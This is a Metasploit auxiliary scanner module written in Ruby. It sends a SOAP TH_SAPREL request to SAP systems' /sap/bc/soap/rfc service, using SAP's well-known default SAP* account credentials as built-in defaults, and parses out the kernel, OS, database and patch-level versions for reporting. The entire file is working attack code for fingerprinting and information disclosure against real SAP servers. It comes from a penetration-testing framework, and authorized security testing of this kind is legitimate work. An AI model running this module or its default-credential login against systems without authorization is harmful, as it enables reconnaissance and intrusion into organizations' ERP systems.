##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

##
# This module is based on, inspired by, or is a port of a plugin available in
# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy. I'd also like to thank Chris John Riley,
# Ian de Villiers and Joris van de Vis who have Beta tested the modules and
# provided excellent feedback. Some people just seem to enjoy hacking SAP :)
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'SAP /sap/bc/soap/rfc SOAP Service TH_SAPREL Function Information Disclosure',
      'Description' => %q{
          This module attempts to identify software, OS and DB versions through the SAP
        function TH_SAPREL using the /sap/bc/soap/rfc SOAP service.
      },
      'References' => [
        [ 'URL', 'https://labs.f-secure.com/tools/sap-metasploit-modules/' ]
      ],
      'Author' => [
        'Agnivesh Sathasivam',
        'nmonkee'
      ],
      'License' => MSF_LICENSE,
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [],
        'Reliability' => []
      }
    )

    register_options(
      [
        Opt::RPORT(8000),
        OptString.new('CLIENT', [true, 'SAP Client', '001']),
        OptString.new('HttpUsername', [true, 'Username', 'SAP*']),
        OptString.new('HttpPassword', [true, 'Password', '06071992'])
      ]
    )
  end

  def run_host(ip)
    data = '<?xml version="1.0" encoding="utf-8" ?>'
    data << '<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
    data << '<env:Body>'
    data << '<n1:TH_SAPREL xmlns:n1="urn:sap-com:document:sap:rfc:functions" env:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
    data << '</n1:TH_SAPREL>'
    data << '</env:Body>'
    data << '</env:Envelope>'

    print_status("[SAP] #{ip}:#{rport} - sending SOAP TH_SAPREL request")

    begin
      res = send_request_cgi({
        'uri' => '/sap/bc/soap/rfc',
        'method' => 'POST',
        'data' => data,
        'cookie' => "sap-usercontext=sap-language=EN&sap-client=#{datastore['CLIENT']}",
        'ctype' => 'text/xml; charset=UTF-8',
        'encode_params' => false,
        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
        'headers' => {
          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions'
        },
        'vars_get' => {
          'sap-client' => datastore['CLIENT'],
          'sap-language' => 'EN'
        }
      })
      if res && (res.code == 200)
        kern_comp_on = ::Regexp.last_match(1) if res.body =~ %r{<KERN_COMP_ON>(.*)</KERN_COMP_ON>}i
        kern_comp_time = ::Regexp.last_match(1) if res.body =~ %r{<KERN_COMP_TIME>(.*)</KERN_COMP_TIME>}i
        kern_dblib = ::Regexp.last_match(1) if res.body =~ %r{<KERN_DBLIB>(.*)</KERN_DBLIB>}i
        kern_patchlevel = ::Regexp.last_match(1) if res.body =~ %r{<KERN_PATCHLEVEL>(.*)</KERN_PATCHLEVEL>}i
        kern_rel = ::Regexp.last_match(1) if res.body =~ %r{<KERN_REL>(.*)</KERN_REL>}i
        saptbl = Msf::Ui::Console::Table.new(
          Msf::Ui::Console::Table::Style::Default,
          'Header' => '[SAP] System Info',
          'Prefix' => "\n",
          'Postfix' => "\n",
          'Indent' => 1,
          'Columns' =>
            [
              'Info',
              'Value'
            ]
        )
        saptbl << [ 'OS Kernel version', kern_comp_on ]
        saptbl << [ 'SAP compile time', kern_comp_time ]
        saptbl << [ 'DB version', kern_dblib ]
        saptbl << [ 'SAP patch level', kern_patchlevel ]
        saptbl << [ 'SAP Version', kern_rel ]
        print(saptbl)

        report_note(
          host: ip,
          proto: 'tcp',
          port: rport,
          sname: 'sap',
          type: 'os.kernel.version',
          data: { os_kernel_version: kern_comp_on }
        )

        report_note(
          host: ip,
          proto: 'tcp',
          port: rport,
          sname: 'sap',
          type: 'sap.time.compile',
          data: { sap_compile_time: kern_comp_time }
        )

        report_note(
          host: ip,
          proto: 'tcp',
          port: rport,
          sname: 'sap',
          type: 'sap.db.version',
          data: { db_version: kern_dblib }
        )

        report_note(
          host: ip,
          proto: 'tcp',
          port: rport,
          sname: 'sap',
          type: 'sap.version.patch_level',
          data: { sap_patch_level: kern_patchlevel }
        )

        report_note(
          host: ip,
          proto: 'tcp',
          port: rport,
          type: 'sap.version',
          data: { sap_version: kern_rel }
        )

      elsif res && (res.code == 500)
        response = res.body
        error.push(response.scan(%r{<message>(.*?)</message>}))
        err = error.join.chomp
        print_error("[SAP] #{ip}:#{rport} - #{err.gsub('&#39;', '\'')}")
        return
      else
        print_error("[SAP] #{ip}:#{rport} - error message: " + res.code.to_s + ' ' + res.message) if res
        return
      end
    rescue ::Rex::ConnectionError
      print_error("[SAP] #{ip}:#{rport} - Unable to connect")
      return
    end
  end
end
